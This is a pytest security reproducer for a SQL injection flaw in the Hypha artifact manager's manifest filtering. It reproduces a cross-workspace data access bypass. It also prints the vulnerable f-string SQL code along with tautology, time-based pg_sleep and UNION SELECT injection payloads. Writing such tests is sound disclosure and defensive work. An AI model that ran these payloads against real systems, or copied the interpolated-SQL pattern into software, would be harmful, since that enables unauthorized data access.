"""Minimal SQL injection reproducer for Hypha.

CRITICAL VULNERABILITY: hypha/artifact.py:_build_manifest_condition()
uses string interpolation with user-controlled input directly in SQL queries.
"""
import pytest
from hypha_rpc import connect_to_server
from . import SERVER_URL_SQLITE


@pytest.mark.asyncio
async def test_manifest_sql_injection_basic(minio_server, fastapi_server_sqlite, test_user_token):
    """Reproduce SQL injection vulnerability in manifest filtering.

    VULNERABILITY LOCATION: hypha/artifact.py:8186-8228

    The _build_manifest_condition() method builds SQL queries using f-strings:

    Line 8186:
        return text(f"manifest->>'{manifest_key}' ILIKE '{value.replace('*', '%')}'")

    Line 8190:
        return text(f"json_extract(manifest, '$.{manifest_key}') LIKE '{value.replace('*', '%')}'")

    This allows SQL injection through the 'value' parameter.

    ATTACK SCENARIO:
    1. Attacker creates artifact in workspace-A
    2. Attacker switches to workspace-B
    3. Attacker uses SQL injection in manifest filter to access workspace-A data
    """
    server_url = SERVER_URL_SQLITE

    # First connect to default workspace to create custom workspaces
    api_root = await connect_to_server({
        "name": "root",
        "server_url": server_url,
        "token": test_user_token
    })

    # Create workspace A
    await api_root.create_workspace({
        "name": "workspace-a",
        "description": "Victim workspace",
        "persistent": True
    })

    # Create workspace B
    await api_root.create_workspace({
        "name": "workspace-b",
        "description": "Attacker workspace",
        "persistent": True
    })

    # Create victim artifact in workspace A
    api_a = await connect_to_server({
        "name": "victim",
        "server_url": server_url,
        "workspace": "workspace-a",
        "token": test_user_token
    })

    artifact_mgr_a = await api_a.get_service("public/artifact-manager")

    victim_artifact = await artifact_mgr_a.create(
        alias="confidential",
        manifest={
            "name": "Secret Document",
            "classification": "top-secret"
        }
    )

    print(f"Created victim artifact: {victim_artifact['id']}")

    # Attacker in workspace B tries SQL injection
    api_b = await connect_to_server({
        "name": "attacker",
        "server_url": server_url,
        "workspace": "workspace-b",
        "token": test_user_token
    })

    artifact_mgr_b = await api_b.get_service("public/artifact-manager")

    # SQL injection payload to bypass workspace filtering
    # For SQLite: Inject into LIKE clause to create OR condition
    injection_value = "test' OR '1'='1"

    print(f"\nAttempting SQL injection with payload: {injection_value}")

    try:
        # This should only return artifacts from workspace-b
        # But SQL injection may expose workspace-a artifacts
        results = await artifact_mgr_b.list(
            filters={"manifest": {"name": {"$like": injection_value}}}
        )

        print(f"Query returned {len(results)} artifacts")

        # Check if we accessed workspace-a data
        for artifact in results:
            print(f"  - {artifact['id']} (workspace: {artifact['workspace']})")

            if artifact['workspace'] == 'workspace-a':
                pytest.fail(
                    f"SQL INJECTION VULNERABILITY CONFIRMED!\n"
                    f"Accessed artifact from workspace-a while authenticated to workspace-b:\n"
                    f"  ID: {artifact['id']}\n"
                    f"  Manifest: {artifact.get('manifest')}\n"
                    f"\nThis demonstrates complete workspace isolation bypass."
                )

    except Exception as e:
        print(f"Query failed with error: {e}")
        # Even if it errors, the injection syntax was attempted
        if "syntax error" in str(e).lower() or "sql" in str(e).lower():
            print("SQL syntax error suggests injection reached the database layer")


@pytest.mark.asyncio
async def test_manifest_key_sql_injection(minio_server, fastapi_server_sqlite, test_user_token):
    """Test SQL injection via manifest key names.

    VULNERABILITY: The manifest_key parameter is directly interpolated:
    f"json_extract(manifest, '$.{manifest_key}')"

    If attacker can control key names, they can inject SQL.
    """
    server_url = SERVER_URL_SQLITE

    api = await connect_to_server({
        "name": "attacker",
        "server_url": server_url,
        "token": test_user_token
    })

    artifact_mgr = await api.get_service("public/artifact-manager")

    # Try to inject via key name
    # This tests if the filter parser allows arbitrary key names
    malicious_key = "name') OR ('1'='1"

    try:
        results = await artifact_mgr.list(
            filters={"manifest": {malicious_key: "anything"}}
        )

        print(f"Malicious key injection returned {len(results)} results")

    except Exception as e:
        print(f"Key injection error: {e}")


@pytest.mark.asyncio
async def test_demonstrate_vulnerable_code(fastapi_server_sqlite, test_user_token):
    """Document the vulnerable code pattern for reference.

    This test doesn't execute attacks but shows what makes the code vulnerable.
    """

    # VULNERABLE CODE from hypha/artifact.py:8176-8230
    vulnerable_code = '''
    def _build_manifest_condition(self, manifest_key, operator, value, backend):
        """Helper function to build SQL conditions for manifest fields."""
        if operator == "$like":
            # Fuzzy matching
            if backend == "postgresql":
                # VULNERABLE: Direct f-string interpolation of user input
                return text(
                    f"manifest->>'{manifest_key}' ILIKE '{value.replace('*', '%')}'")
                )
            else:
                # VULNERABLE: Same issue in SQLite
                return text(
                    f"json_extract(manifest, '$.{manifest_key}') LIKE '{value.replace('*', '%')}'")
                )
    '''

    print("VULNERABLE CODE PATTERN:")
    print(vulnerable_code)

    print("\n\nATTACK EXAMPLES:")
    print("1. Bypass workspace filter:")
    print("   value = \"test' OR '1'='1\"")
    print("   Results in: manifest->>'name' ILIKE 'test' OR '1'='1%'")

    print("\n2. Access other workspace data:")
    print("   value = \"' OR workspace != 'current-workspace' OR manifest->>'name' ILIKE '\"")
    print("   Results in full cross-workspace data access")

    print("\n3. Time-based exfiltration (PostgreSQL):")
    print("   value = \"' OR (SELECT CASE WHEN EXISTS(...) THEN pg_sleep(5) END) IS NOT NULL OR '\"")
    print("   Can exfiltrate data bit-by-bit")

    print("\n4. UNION-based injection:")
    print("   value = \"' UNION SELECT id, workspace, ... FROM artifacts --\"")
    print("   Can extract arbitrary data from database")

    # This test always passes - it's documentation
    pass
